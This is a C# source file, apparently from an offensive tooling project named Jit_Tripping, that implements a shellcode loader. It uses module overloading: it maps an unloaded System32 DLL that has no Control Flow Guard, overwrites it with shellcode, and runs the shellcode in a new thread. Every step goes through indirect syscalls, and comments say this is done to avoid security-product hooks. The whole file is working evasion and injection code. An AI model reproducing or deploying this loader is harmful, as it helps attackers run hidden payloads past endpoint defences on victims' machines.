﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using static Jit_Tripping.Structs.Win32.Enums;
using static Jit_Tripping.Delegates;

namespace Jit_Tripping
{
    /// <summary>
    /// Various functions that are helpful
    /// </summary>
    public class Utils
    {
        public static void inject(byte[] shellcode, dll ntdll)
        {
            //byte[] shellcode = Convert.FromBase64String(base64Str);

            IntPtr pBaseAddress = overload(shellcode, ntdll);
            IntPtr hThread = IntPtr.Zero;
            object[] threadargs = new object[] { hThread, (uint)0x02000000, IntPtr.Zero, Process.GetCurrentProcess().Handle, pBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
            ntdll.indirectSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", threadargs);
            hThread = (IntPtr)threadargs[0];

/*
            Structs.LargeInteger li = new Structs.LargeInteger();
            long second = -10000000L;
            li.QuadPart = 5*second;
            IntPtr ptr =  Marshal.AllocHGlobal(Marshal.SizeOf(li));
            Marshal.StructureToPtr(li, ptr, true);
*/
            ntdll.indirectSyscallInvoke<Delegates.NtWaitForSingleObject>("NtWaitForSingleObject", new object[] { hThread, false, IntPtr.Zero  });
        }
        /// <summary>
        /// Basically what TheWover did. Loads an arbitrary system32 dll (without calling dllmain) and write shellcode in.
        /// </summary>
        /// <param name="shellcode"></param> Byte array of the shellcode
        /// <param name="ntdll"></param>An ntdll instance to do indirect syscalls
        /// <returns>An IntPtr to the base of the dll (where the shellcode is loaded)</returns>
        public static IntPtr overload(byte[] shellcode, dll ntdll)
        {
            int size = shellcode.Length;
            string dllToOverload = "";
            string SystemDirectoryPath = Environment.GetEnvironmentVariable("WINDIR") + Path.DirectorySeparatorChar + "System32";
            List<string> files = new List<string>(Directory.GetFiles(SystemDirectoryPath, "*.dll"));
            foreach (ProcessModule Module in Process.GetCurrentProcess().Modules)
            {
                if (files.Any(s => s.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)))
                {
                    files.RemoveAt(files.FindIndex(x => x.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)));
                }
            }

            //Pick a random candidate that meets the requirements

            Random r = new Random();
            //List of candidates that have been considered and rejected
            List<int> candidates = new List<int>();
            //while (candidates.Count != files.Count)
            while (true) //more stable for edge cases?
            {
                //Iterate through the list of files randomly
                int rInt = r.Next(0, files.Count);
                string currentCandidate = files[rInt];

                //Check that the size of the module meets requirements
                if (candidates.Contains(rInt) == false && new FileInfo(currentCandidate).Length >= size && !checkCFG(currentCandidate))
                {
                    if (currentCandidate.ToLower().Contains("authfwsnapin.dll")) continue;
                    dllToOverload = currentCandidate;
                    break;
                }
                candidates.Add(rInt);
            }
            //if (candidates.Count == files.Count)Console.WriteLine("We are fucked");

            //Overloading time
           //Console.WriteLine($"We are going to use {dllToOverload}");
            //Init the UNICODE_STRING argument for mapview
            Structs.UNICODE_STRING dllName = new Structs.UNICODE_STRING();
            void RtlInitUnicodeString(ref Structs.UNICODE_STRING destinationString, string SourceString)
            {
                //Rewritten RtlInitUnicodeString because I do not want to chance hooks.
                short maxSize = (short.MaxValue & ~1) - 2; //sizeof(UNICODE_NULL) = 4 but for some reason half
                short normalSize = (short)(SourceString.Length * 2); //sizeof(WCHAR) = 4, but for some reason half 
                if (normalSize > maxSize) size = maxSize;
                destinationString.Length = (ushort)normalSize;
                destinationString.MaximumLength = (ushort)(normalSize + 2);
                destinationString.Buffer = Marshal.StringToHGlobalUni(SourceString); //write the string into memory

            }
            
            RtlInitUnicodeString(ref dllName, (@"\??\" + dllToOverload));
            //Map it into memory
            IntPtr pDllName = Marshal.AllocHGlobal(Marshal.SizeOf(dllName));
            Marshal.StructureToPtr(dllName, pDllName, true);

            //Initialize Object Attributes
            Structs.OBJECT_ATTRIBUTES objectAttributes = new Structs.OBJECT_ATTRIBUTES();
            objectAttributes.Length = Marshal.SizeOf(objectAttributes);
            objectAttributes.ObjectName = pDllName;
            objectAttributes.Attributes = 0x40; //OBJ_CASE_INSENSITIVE

            Structs.IO_STATUS_BLOCK ioStatusBlock = new Structs.IO_STATUS_BLOCK();

            //grabbing the file handle
            IntPtr hFile = IntPtr.Zero;
            object[] argsNtOpenFile = new object[] { hFile, FileAccessFlags.FILE_READ_DATA | FileAccessFlags.FILE_EXECUTE | FileAccessFlags.FILE_READ_ATTRIBUTES | FileAccessFlags.SYNCHRONIZE, objectAttributes, ioStatusBlock, FileShareFlags.FILE_SHARE_READ | FileShareFlags.FILE_SHARE_DELETE, FileOpenFlags.FILE_SYNCHRONOUS_IO_NONALERT | FileOpenFlags.FILE_NON_DIRECTORY_FILE };
            var retval = ntdll.indirectSyscallInvoke<Delegates.NtOpenFile>("NtOpenFile", argsNtOpenFile);
            hFile = (IntPtr)argsNtOpenFile[0];
#if debug
           //Console.WriteLine("hfile: 0x{0:X}, status code 0x{1:X}", hFile, retval);
#endif
            objectAttributes = (Structs.OBJECT_ATTRIBUTES)argsNtOpenFile[2];
            ioStatusBlock = (Structs.IO_STATUS_BLOCK)argsNtOpenFile[3];

            //Creating a section from the file handle
            IntPtr hSection = IntPtr.Zero;
            ulong MaxSize = 0;
            object[] argsNtCreateSection = new object[] { hSection, SECTION_ALL_ACCESS, IntPtr.Zero, MaxSize, PAGE_READONLY, SEC_IMAGE, hFile };
            ntdll.indirectSyscallInvoke<Delegates.NtCreateSection>("NtCreateSection", argsNtCreateSection);
            hSection = (IntPtr)argsNtCreateSection[0];
            MaxSize = (ulong)argsNtCreateSection[3];

            //Mapping View of the section
            IntPtr pBaseAddress = IntPtr.Zero;
            object[] argsNtMapViewOfSection = new object[] { hSection, (IntPtr)(-1), pBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, (IntPtr)size, (uint)0x2, (uint)0x0, PAGE_EXECUTE_READWRITE };
            ntdll.indirectSyscallInvoke<Delegates.NtMapViewOfSection>("NtMapViewOfSection", argsNtMapViewOfSection);
            pBaseAddress = (IntPtr)argsNtMapViewOfSection[2];
 

            //Make page writeable
#if debug
           //Console.WriteLine("Changing to be writeable");
#endif
            uint ntstatus = (uint)ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)size, PAGE_READWRITE, (uint)0 });
#if debug
           //Console.WriteLine("Ntstatus of protect: 0x{0:X}", ntstatus);
#endif
            //Copy shellcode into the mapped dll
            byte[] nullbyte = new byte[size];
            for (int i = 0; i < size; i++) nullbyte[i] = 0x00;
#if debug
           //Console.WriteLine($"Dll is {File.ReadAllBytes(dllToOverload).Length.ToString()} bytes");
           //Console.WriteLine("{1} will be at 0x{0:X}", (long)pBaseAddress, dllToOverload);
            
           //Console.WriteLine($"Hollowing {nullbyte.Length.ToString()} bytes");
#endif
            Marshal.Copy(nullbyte, 0, pBaseAddress, nullbyte.Length);
#if debug
           //Console.WriteLine("{1} written to 0x{0:X}", (long)pBaseAddress, dllToOverload);
#endif
            Marshal.Copy(shellcode, 0, pBaseAddress, shellcode.Length);

            //Change back to executable
            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)size, PAGE_EXECUTE_READ, (uint)0 });
            return pBaseAddress;
        }

        /// <summary>
        /// Frees a module from memory. Do this on an overloaded module once it has no more use.
        /// </summary>
        /// <param name="ntdll"></param> An ntdll instance
        /// <param name="pBaseAddress"></param> Base address of the module to unload
        public static void freeOverload(dll ntdll, IntPtr pBaseAddress)
        {
            IntPtr regionSize = IntPtr.Zero;
            ntdll.indirectSyscallInvoke<Delegates.NtUnmapViewOfSection>("NtUnmapViewOfSection", new object[] { (IntPtr)(-1), pBaseAddress });
            ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, regionSize, (uint)0x8000 });
        }


        /// <summary>
        /// Execute an API in the dll by creating a delegate to it. It is also sorta dogshit since its vulenrable to hooks
        /// </summary>
        /// <typeparam name="T"></typeparam> The Delegate to utilize
        /// <param name="ntdll"></param> An ntdll instance
        /// <param name="name">Name of the API</param>
        /// <param name="arr"></param> Object array of arguments to pass
        /// <returns>An object that can be casted to the return type of the delegate</returns>
        public static object dynamicAPIInvoke<T>(dll ntdll, string name, object[] arr) where T : Delegate
        {
            return Marshal.GetDelegateForFunctionPointer(ntdll.dictOfExports[name], typeof(T)).DynamicInvoke(arr);
        }

        //https://github.com/NetSPI/PESecurity/blob/master/Get-PESecurity.psm1. CFG is a bitch in some dlls that wont let us just jump into their address space
        public static bool checkCFG(string dllPath)
        {
            byte[] dllBytes = File.ReadAllBytes(dllPath);
            int e_lfanew = BitConverter.ToInt32(dllBytes, 0x3c);
            short dllCharacteristics = BitConverter.ToInt16(dllBytes, e_lfanew + 0x18 + 70); //dllcharacteristics offset
            if (((DllCharacteristics)dllCharacteristics).HasFlag(DllCharacteristics.IMAGE_DLLCHARACTERISTICS_GUARD_CF)) return true;
            return false;
        }
    }
}
